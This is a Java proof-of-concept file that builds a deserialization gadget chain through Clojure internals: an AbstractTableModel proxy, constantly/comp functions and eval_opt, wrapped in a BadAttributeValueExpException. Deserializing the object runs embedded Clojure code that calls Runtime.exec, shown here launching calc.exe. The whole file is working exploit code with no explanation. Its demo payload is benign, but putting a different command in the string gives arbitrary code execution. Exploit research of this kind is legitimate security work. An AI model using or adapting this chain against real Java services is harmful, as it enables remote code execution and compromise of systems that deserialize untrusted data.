package com.example.Clojure;

import clojure.core$comp$fn__4727;
import clojure.core$constantly$fn__4614;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

public class POC_1 {

    public static void main(String[] args) throws Exception {
        String payload1 = "(import 'java.lang.Runtime)\n" +
                "(. (Runtime/getRuntime) exec\"calc.exe\")";

        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();

        HashMap<Object, Object> map = new HashMap<>();

        core$constantly$fn__4614 core1 = new core$constantly$fn__4614(payload1);
        core$comp$fn__4727 core2 = new core$comp$fn__4727(core1, new clojure.main$eval_opt());

        map.put("hashCode", core2);
        model.__initClojureFnMappings(PersistentArrayMap.create(map));

        BadAttributeValueExpException exception = new BadAttributeValueExpException("1");
        ReflectionUtil.setField(exception, "val", model);

        SerializeUtil.deserialize(SerializeUtil.serialize(exception));
    }

}
